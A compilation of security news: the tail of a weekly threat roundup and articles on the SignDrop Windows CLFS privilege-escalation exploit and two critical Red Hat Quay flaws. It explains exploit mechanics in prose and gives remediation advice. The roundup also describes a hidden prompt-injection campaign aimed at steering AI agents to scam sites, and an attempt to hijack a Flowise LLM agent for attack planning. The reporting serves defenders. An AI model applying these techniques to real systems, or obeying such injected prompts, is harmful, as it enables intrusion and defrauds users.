same core framework. "An actor leveraged Falcon to compromise visitors of webmail portals and government web applications by placing malicious JavaScript directly within these sites," Palo Alto Networks Unit 42 said. "Operating entirely inside the browser context, attackers have used the framework to sideload malicious Chrome extensions and steal the following information: passwords, emails, session cookies, [and] communications." Falcon has also been used to deliver an implant dubbed Antino, which uses Microsoft OneDrive as a C2 channel. The activity has targeted government entities in one Middle Eastern country and four Southeast Asian countries between March and May 2026. "The campaigns we observed targeted ministries of foreign affairs, defense and interior, and law enforcement agencies, consistent with strategic intelligence collection objectives," Unit 42 said. 59 Linux kernel bugs uncovered Microsoft said its scan of a subset of Linux kernel subsystems from late May to mid-June 2026 unearthed 26,502 raw findings using MDASH, which subsequently formed the basis for 59 public upstream reports and 33 assigned CVEs. This includes working root privilege-escalation exploits for eight of those CVEs, such as CVE-2026-64563. "CVE-2026-64563 is a one-line state-reset bug in rhashtable, the Linux kernel's shared resizable hash table," Microsoft said. "Because callers trust the object pointers returned by a table walk, this small library flaw enabled a stable local privilege escalation on Linux -- and affected Android with SELinux enforcing -- without requiring special kernel configurations or user namespaces." AI-assisted espionage in Central Asia An exposed Silent Lynx server has uncovered cyber espionage operations targeting Central Asian governments and critical infrastructure from April to October 2026. "The directory held the group's tooling alongside data from active intrusions into government and critical infrastructure organisations across the region, and the AI agent the operator relied on to run them," CloudSEK said. "We assess with medium confidence that the operator has a Kazakhstan nexus: the operation runs in Russian, and the operator's own test traffic came from a residential Kazakh connection, which supports existing vendor assessments. The collection priorities, spanning transport, defence correspondence and resource ministries in neighbouring states, point to regional intelligence gathering rather than financial motive." Contractor access fuels ransomware attacks A new Russian-speaking ransomware group called Citrus is targeting Windows systems in corporate environments. The attackers have been found to gain access through compromised contractor accounts and leverage AI-generated PowerShell scripts, batch files, and commands during later stages of the intrusion. In an attempt to reduce visibility, the threat actor removes tools and output files after execution, clears command history, and deletes event logs. The group also disguises tools and related artifacts with benign-looking names to make them appear legitimate by using a trusted brand name. The ransomware is a Sn00py-family ransomware variant written in Go. On Windows systems, the malware encrypts user files and appends the .citrus extension, while taking steps to hinder recovery and incident response. Kaspersky said the activity shares several similarities with Toy Ghouls. "Citrus stands out for the way AI-generated content appears to support hands-on intrusion activity on compromised systems," said Stanislav Larinsky, Kaspersky Security Services expert. "In the cases we investigated, the attackers combined third-party account access, privilege-escalation attempts and domain-wide deployment techniques. These incidents show how limited contractor access can become a path to broader compromise if it is not tightly controlled and continuously monitored." Malicious AI agents exploit OAuth consent Proofpoint has disclosed details of a new technique called BluePhishing that's described as the "next evolution of OAuth consent abuse," enabling bad actors to leverage agent identities like Microsoft Entra Agent ID for initial access. BluePhishing "socially engineer[s] victims into granting consent to a malicious agent blueprint for initial access," it said. "Analogous to app consent phishing where attackers use client credentials to gain initial access to a tenant, BluePhishing extends this technique to the agent ecosystem. By exploiting gaps in visibility and governance around emerging AI agent adoption, attackers can abuse one-time consent links to create agent identities in target tenants, obtain access tokens, and operate with the privileges assigned to those agents." AI age checks expand worldwide Meta has announced that it's expanding its AI age-estimation technology globally to automatically place millions of teens in Teen Account protections on Instagram. "We use AI technology to find people we suspect to be teens, even if they use an adult birthday, and place them in Teen Account protections," Meta said. "As a result, millions more teens across the world who use Instagram will receive these built-in protections, even if they've misrepresented their age." In Australia, Meta has opted to use Apple's age-range signal as another method to help understand age. OAuth support for Exchange migrations Microsoft 365 Mailbox Replication Service (MRS) has added support for OAuth as an authentication method when migrating mailboxes between Microsoft 365 and an on-premises Exchange environment. "Once OAuth for MRS is configured, tenant administrators can create an OAuth migration endpoint and use it in migration batches or in onboarding and offboarding move jobs," Microsoft said. "You can use this method in both hybrid and non-hybrid organizations." NTLM signing hardened against relay attacks In more Microsoft-related news, the tech giant has incorporated additional protections into Windows starting November 10, 2026, that address CVE-2026-118737 (CVSS score: 8.1), a critical remote code execution flaw in Remote Procedure Call Runtime that could allow an unauthorized attacker to execute code over a network. "These updates represent the first phase of improvements to NTLM message signing," Microsoft said. "These changes help ensure that authenticated NTLM sessions always establish a cryptographic session key and negotiate real message signing, reducing exposure to relay attacks." To that end, Windows servers will begin requiring NTLM signing by default starting May 2027. Exposed cloud credentials lingered 18 months Details have emerged about a now-patched security flaw affecting the Planning Inspectorate, an executive agency of the United Kingdom's Ministry of Housing, Communities and Local Government (MHCLG). The issue involved a complete Microsoft Entra ID application credential that was committed in plaintext to a GitHub repository. "Although removed from the branch, the commit was orphaned via a force push and remained retrievable via GitHub's raw object CDN for 18 months," ControlPlane said. The client secret was deleted about 20 minutes after responsible disclosure on August 26, 2026. Fake software sites spread infostealer An SEO poisoning campaign is using fake websites impersonating the Chocolatey package manager and the Microsoft Activation Scripts (MAS) tool to distribute a Python-based malware called Armorsteal. "The installer deployed a Python 3.11 runtime environment and three main components providing remote access, surveillance, and information stealing capabilities, with the Python code protected by Pyarmor," Zscaler said. "The remote access component communicates with a command-and-control (C2) server, downloads additional modules, and executes remote tasks. The surveillance component logs keystrokes, monitors the clipboard, captures screenshots, and displays fake cryptocurrency wallet notifications. The information stealing component targets browser data, Discord tokens, cryptocurrency wallets, seed phrases, saved passwords, SSH keys, and Steam data." Localized phishing delivers banking trojan A new Grandoreiro banking malware campaign is targeting users across Argentina, Chile, Colombia, Mexico, and Peru through country-specific phishing lures that are tailored to each region. "The campaign uses localized phishing lures, primarily in Spanish, with some observed using Portuguese even when targeting Spanish-speaking countries," Arctic Wolf said. "The phishing chain relies on recently registered domains and layered redirection to hinder detection. The final payload is retrieved through a Domain Generation Algorithm (DGA) seeded with the current date. The downloaded ZIP archive uses a deeply nested folder structure populated with two legitimate PE files and two benign PDF documents. A VBScript file located in the archive's root directory acts as the primary payload, employing junk code and multiple layers of obfuscation before reconstructing and launching a Delphi-based loader." The loader masquerades as a PDF reader and is used to fetch and run the banking trojan. AI search results targeted by scam sites Palo Alto Networks Unit 42 said it detected an indirect prompt injection (IDPI) campaign across 26 domains. "These are attempting black-hat Generative Engine Optimization (GEO) to game AI-powered search results," Unit 42 said. "Almost all of the 26 pages have very similar content, presenting as AI-powered digital asset trading platforms. These sites appear to be scam sites designed to collect user information. The injected prompt is set to be hidden from a regular web user but likely visible to an AI agent. These attacks intend to poison SEO and manipulate AI agents to eventually get users to visit these sites." PyPI adds release verification signals The Python Package Index (PyPI) has added a security tab to its project pages, giving developers easy access to security signals. "The new security tab communicates release provenance states and displays per-file attestations, giving you a dedicated place to verify where the release files came from," PyPI said. "PyPI calculates each release's provenance state by checking whether each release file has an attestation." 100+ domains spread credential stealer The information stealer known as RevStealer is being propagated as part of an "industrial-scale, financially motivated campaign" that uses game cheats and AI tools as lures. The payload is distributed through more than 100 interconnected domains, trojanized Electron applications masquerading as Anthropic's Claude Opus 5, and hijacked YouTube distribution channels, per Akatsuki Legion. "Once executed, the malware performs a ten-point weighted sandbox-evasion scoring routine, decrypts an AES-256-CBC in-memory payload, and leverages fourteen indirect syscall wrappers and FNV-1a API hashing to bypass user-mode hooks before systematically harvesting credentials from browsers, password managers, cryptocurrency wallets, Steam, Roblox, Battle.net, EA Desktop, and Minecraft; then exfiltrating the loot as streamed, encrypted typed records over HTTPS, with a resilient Polygon blockchain dead-drop resolver standing by as a fallback command-and-control channel," the independent adversary research group said. AI infrastructure becomes an attack target Threat actors have increasingly targeted AI orchestration platforms over the past few months, according to Sekoia. This is because "they concentrate API keys, enterprise data, and access to external tools," it added. This includes Flowise, which has been affected by multiple security flaws like CVE-2025-59528 and CVE-2026-41264. In one exploitation attempt recorded in August 2026, a suspected Chinese-speaking actor abused legitimate Flowise functionality to conduct automated reconnaissance and attempted to hijack the LLM agent to serve as an offensive analysis vector against external targets. "The attacker attempted to turn the AI agent into an interactive offensive assistant, submitting real-world reconnaissance data (Nightingale/Redis infrastructure) to generate custom exploitation playbooks and target analysis," Sekoia said. AI-built phishing kits multiply LevelBlue has disclosed details of a family of phishing kits named BlackApex, DarkApex, SPY, XXX101-TOKEN, OGPARKER1, W1-TOKEN, and ALIBOBO-TOKEN that are used to facilitate device code phishing attacks using shared document lures. The findings once again demonstrate how AI can speed up the development of a convincing multi-brand phishing kit. "Across all of its lures, the source shows traits we associate with AI-generated code, whether from direct prompts to a language model or from a person working alongside an AI coding assistant," LevelBlue said. "The code, endpoints, and interface are the same across all of them. We cannot say whether these names reflect separate operators, resellers or customers of a single kit, but the pattern is consistent with a shared product being rebranded and redeployed." AI verifies Signal security properties Google's DeepMind has introduced AlphaProof Code, which brings together human experts and AI agents to verify software and mathematically demonstrate that it works as intended. The multi-agent AI framework has been used to prove key security properties of libsignal, the Signal protocol's reference implementation, at the machine-code level. "AlphaProof Code consists of a human-guided agent for writing Lean specifications of code, a formal semantics of AArch64 machine code, and a team of autonomous prover agents whose proofs are accepted only if Lean’s kernel checks them against the approved specification," DeepMind said. "Applied to libsignal, our agents generated about 6.5 million lines of machine-checked Lean proof code, resting on about 26,000 lines of trusted specifications and AArch64 semantics. The proofs cover Signal’s post-quantum PQXDH handshake and Triple Ratchet, establishing forward secrecy, authentication, post-compromise security, and handshake secrecy." That's the lot for this week. Some attacks were carefully planned. Others relied on old mistakes, trusted accounts, or someone clicking the wrong thing. AI is showing up on both sides, making attacks easier to build while helping researchers find problems faster. The tools keep changing, but attackers still seem happy to use whatever works.The good news is that some of these threats are being stopped, and defenses are slowly catching up. The bad news is that fixing a bug, removing a file, or blocking an attacker doesn't always mean the problem is gone. Sometimes the damage sticks around longer than anyone expects. Worth keeping in mind before the next batch of headlines arrives.

1wpy3at.text: Public exploit code released earlier this week claims that a local Windows user can gain SYSTEM privileges through the Common Log File System driver. The proof of concept, called SignDrop, targets a log-authentication feature added to the driver last year. It abuses how clfs.sys creates companion files when a privileged process opens a prepared log, using path redirection to take control of the operation. Microsoft has not confirmed the claimed flaw, assigned a CVE, or released a fix. The researcher behind the exploit, who publishes under the name MSNightmare, released the code and a detailed writeup on GitHub on Tuesday, the same day the company published its November security updates. CLFS is a logging subsystem built into Windows. Its driver has been a frequent target for privilege escalation: 10 CLFS flaws appear in CISA's catalog of vulnerabilities known to have been exploited in attacks, including one used in ransomware campaigns in April 2025. To reduce that exposure, Microsoft added an authentication check to CLFS log files in updates for Windows 11 25H2, 26H1, and Windows Server 2025 shipped in October 2025. The check attaches a hash-based message authentication code, built from log data and a key unique to each machine. The driver then parses only log files it wrote. A companion .cnpf file stores recovery data beside each log and is created with the same security attributes as the original, according to the company's logfile authentication page. SignDrop targets the creation of that companion file. According to the proof-of-concept code, a standard user prepares a CLFS log and container with paths the user controls. When a privileged process later opens that log, the driver creates the .cnpf file in the privileged process's security context rather than the user's. The exploit uses object manager symbolic links to redirect that file creation to a location the attacker chooses. In the published code, the privileged process is the Defender antimalware service, triggered through its update interface. "Everything is done properly by Microsoft here but the logic allows abuse," the researcher wrote. Because the .cnpf file inherits the original log's permissions, the result is a file created as SYSTEM that the standard user can write to. The researcher says that can be chained into a SYSTEM shell. The exploit was tested on Windows 11 26H2, a Windows 11 26H2 Experimental build, and Windows Server 2025 Experimental, according to the repository. Systems are affected when the CLFS authentication registry mode is set to 0 (enforced) or 1 (learning). Systems older than 90 days typically move from learning to enforcement automatically, so the default configuration on established installations is the one the exploit targets. A registry value of 2 or 3 means the mitigation is disabled. That takes the system outside the claimed attack surface, but the researcher and the driver's own documentation both warn against it: disabling lets CLFS parse tampered log files, reopening the memory corruption flaws the protection was built to prevent. Independent Test Sungyup Nam, head of research at Korean security firm 78researchlab, reported in a published assessment today that researcher Heewon Song of the firm's PurpleHound offensive content team tested the exploit and found that it works. Song assessed that it does not run reliably enough for operational use, Nam wrote. Defender must be enabled for the published chain to succeed. Running the exploit changes every UAC prompt to open a standard user shell and a SYSTEM shell, blocking other actions and making the attack noticeable to anyone at the machine. The repository claims the technique can work against any antimalware engine whose process runs with elevated privileges. That broader claim has not been tested. What Defenders Can Do No CVE, advisory, or patch for SignDrop appeared in the November security updates. The CISA Known Exploited Vulnerabilities catalog does not list it, and no attacks using the exploit have been reported. Administrators can check their exposure by reading the CLFS authentication mode at HKLM\SYSTEM\CurrentControlSet\Services\CLFS\Authentication, where a Mode value of 0 or 1 falls within the researcher's claimed scope. The vendor's mitigation guidance describes the setting and the risks of disabling it. The researcher has released a series of exploits targeting Windows and Defender since April. The vendor confirmed an earlier Defender exploit called RoguePlanet in June as CVE-2026-50656 and patched it the following month. The ShieldBreak bypass followed in August and was assigned CVE-2026-69414. Three of the researcher's earlier Defender flaws have been exploited in attacks. SignDrop is a different class of issue. Where the earlier exploits targeted race conditions in Defender's file handling, this one targets the CLFS driver's own authentication feature. The vendor's security update guide is the place to watch for a response.

5b0s17.text: A critical flaw in Red Hat Quay allows an attacker who can access a Quay registry to read and overwrite private container images in every repository. Quay enables anonymous access by default, and while it is enabled, the attacker needs no account. When it is off, anyone with a valid account can still exploit the flaw, Red Hat said yesterday. The company has released fixed builds for eight Quay 3 branches. The flaw is tracked as CVE-2026-123710 (CVSS score: 9.8). Quay uses keys it trusts to sign the access tokens that allow image pushes and pulls. The flaw lets an attacker add their own key to the keys Quay trusts, with no expiry date. Quay then accepts tokens signed with that key for any repository. With those tokens, an attacker can retrieve private images and any secrets or credentials stored within them. The attacker can also push or overwrite images, and the change propagates to every system that later pulls those images. The planted key survives restarts until someone removes it. It can also be used to delete the keys that running Quay instances use, so normal pushes and pulls start failing with authentication errors. Quay's key server checks that a request to replace a key carries a token signed by a trusted key, with the expected audience and issuer. It does not check whether the token was issued for key rotation. An anonymous token from Quay's /v2/auth endpoint passes: Quay signs it with a trusted key, and the caller chooses its audience. A second critical flaw, CVE-2026-110697 (CVSS score: 9.9), was disclosed at the same time. It lets a Quay user who can create a namespace steal other tenants' robot account tokens and use them to read, push, or overwrite those tenants' images. This flaw is in the code that lists robot accounts. It builds an SQL LIKE pattern from the namespace name without escaping wildcard characters, and in SQL LIKE an underscore matches any single character. So a namespace with an underscore in the right place can match another tenant's namespace and return its robot accounts, with their decrypted tokens. The attacker needs no elevated privileges, and the victim does not have to do anything. Deleting the attacker's namespace also deletes the corresponding robot accounts, which can cut off systems that rely on them. Where Quay is the integrated registry for OpenShift, stolen robot credentials can be used to inject malicious images into CI/CD pipelines, the company says. Red Hat's Dave O'Connor found both flaws. The logic behind CVE-2026-123710 has been in Quay since its first public commit, according to the bug report for that flaw. Red Hat lists every version of Quay 3 and Quay 5 as affected by both flaws. For CVE-2026-123710, its guidance names standalone installs, Quay deployed by the Quay Operator on OpenShift, and the mirror registry for Red Hat OpenShift as affected. Any Quay instance that untrusted clients can reach is exposed, including internal registries, the company says. When checked today, the CVE entry for CVE-2026-123710 still showed every Quay package as affected, with no fix, even though each advisory lists the flaw. The company recommends these steps: At the proxy or load balancer, block the /keys endpoint for everything except trusted internal components. Search the audit logs for service_key_rotate and service_key_delete events where expiration_date is null. Remove any approved service keys you do not recognize. Install the fixed release. Until it is running, an attacker can add a new key the same way, so deleting one does not last. "Turning off anonymous access doesn't protect you," the company says in its key remediation article. A planted key also continues to work after password resets and changes to the robot token. For CVE-2026-110697, the company's CVE page names the same eight releases as fixed, calls updating the only complete fix, and says Quay.io is already fixed. But none of the eight advisories list CVE-2026-110697. Until an update is in place, the company suggests limiting who can create organizations or namespaces containing an underscore, rotating robot tokens for any namespace that matches an underscore namespace, and watching for pulls or pushes that do not fit normal robot use. These steps reduce the exposure, but the flaw remains. The upstream fix adds the missing rotation check, requires keys added through the key server to have an expiry date, and stops callers from choosing a token's audience. The same change fixes the robot account search too.

1qt87o5.text: Security researcher Abdelhamid Naceri (also known as Nightmare Eclipse) has released a new Windows zero-day exploit that can let attackers gain SYSTEM privileges. Named SignDrop, it exploits mitigations Microsoft introduced in October 2025 to defend against authentication attacks targeting vulnerabilities in the Common Log File System (CLFS) driver. Naceri added that attacks exploiting CLFS vulnerabilities dropped sharply after the mitigation, but that Microsoft's mitigation itself introduced this new vulnerability. According to Naceri, the flaw is in how CLFS handles creating the authentication file (".cnpf") when it creates a new log file. He said that CLFS enforces access checks correctly at the start, but the logic can be abused if a different, privileged process later opens the log file. He also added that privileged processes such as Windows Defender can be forced to open the files, so the authentication file gets created with SYSTEM privileges, and CLFS creates it with the original file's access permissions. Naceri noted that Microsoft implemented the mitigation properly but that "the logic allows abuse" and said the technique works against any antimalware engine's self-defense (tamper protection), because the file-creation request appears to come from the engine's own legitimate process. "If everything is chained correctly, funnily, this legit security mitigation can be used against itself and allow an elevation of privileges. Everything is done properly by Microsoft here but the logic allows abuse," the security researcher said. "What makes it funnier is the fact that it can be used against any antimalware engine to bypass their self defense (or tamper protection) mechanism, as you can trigger arbitrary file creation in the context of their own antimalware process so from the perspective of their kernel drivers, the file creation request is coming from their own legit process so it passes, this makes this vulnerability unique as it can be used to turn off any antivirus/EDR." SignDrop PoC exploit (Abdelhamid Naceri) ​While SignDrop can't be used against all Windows machines, Naceri tested the exploit on Windows 11 26H2, Windows 11 26H2 Experimental, and Windows Server 2025 Experimental and estimates that 80% of Windows installations are vulnerable. Naceri recommends running the proof-of-concept (PoC) exploit to check if a Windows device is vulnerable to SignDrop attacks or to check the CLFS authentication mode under the HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CLFS\Authentication\Mode registry value. If the PoC exploit spawns a SYSTEM shell, the machine is vulnerable. Additionally, if the registry value is 0 or 1 (learning mode or enforcement mode), the computer is vulnerable. Naceri added that there is currently no solution except waiting for a patch from Microsoft, since disabling the CLFS mitigation would expose the devices to attacks exploiting memory corruption vulnerabilities. The security researcher, who says he is a former Microsoft employee, has disclosed a long list of other zero-day flaws in Microsoft Defender, BitLocker, and other Windows components since April, including BigDiskBuster, ShieldCrash, ShieldBreak, LegacyHive, RoguePlanet, BlueHammer, RedSun, YellowKey, GreenPlasma, MiniPlasma, and UnDefend. Five years ago, Naceri released several zero-day exploits that allowed privilege escalation on various Windows versions. After Naceri publicly disclosed the zero-days without first attempting to report them privately, Microsoft warned of legal action against anyone engaging in "malicious activity causing real harm" to the company's customers, leading many in the infosec community to see the company's actions as a direct threat to the security researcher. While Microsoft has fixed some of the security flaws Naceri disclosed since the start of the year (including ShieldBreak, RoguePlanet, YellowKey, GreenPlasma, and MiniPlasma flaws), the other zero-day bugs still lack an official patch.
